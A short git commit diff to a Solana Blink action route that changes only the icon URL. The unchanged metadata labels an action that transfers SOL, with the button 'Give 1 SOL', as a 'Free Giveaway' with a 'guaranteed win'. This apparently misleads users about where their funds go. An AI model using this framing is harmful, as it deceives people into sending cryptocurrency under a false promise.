f204ae4a0d9e5395303173f16a7c704a7105dc92
Mark03-lab <mdl.aquino03@gmail.com>
2024-07-20 14:19:52 +0800

    Update route.ts

--- app/api/actions/transfer-sol/route.ts
+++ app/api/actions/transfer-sol/route.ts
@@ -4,7 +4,7 @@ import { transferSolTransaction } from "./transaction";
 export const GET = async (req: Request) => {
     const payload: ActionGetResponse = {
         title: "BLINKS Free Giveaway (first 100 guaranteed win))",
-        icon: "https://wizardofodds.com/wizfiles/img/2366/mines.jpg",
+        icon: "https://www.google.com/url?sa=i&url=https%3A%2F%2Ffil.postermywall.com%2Findex.php%2Fart%2Ftemplate%2Fb1199840f7eeb0ee61840d39e9b84a62%2Fgiveaway-design-template&psig=AOvVaw23UZihaCh_RqhtRmnCMmmg&ust=1721542645670000&source=images&cd=vfe&opi=89978449&ved=0CBEQjRxqFwoTCICqpqz8tIcDFQAAAAAdAAAAABAp",
         description: "Transfer SOL to another wallet",
         label: "Give 1 SOL 🤙🏻🤙🏻🤙🏻"
     }
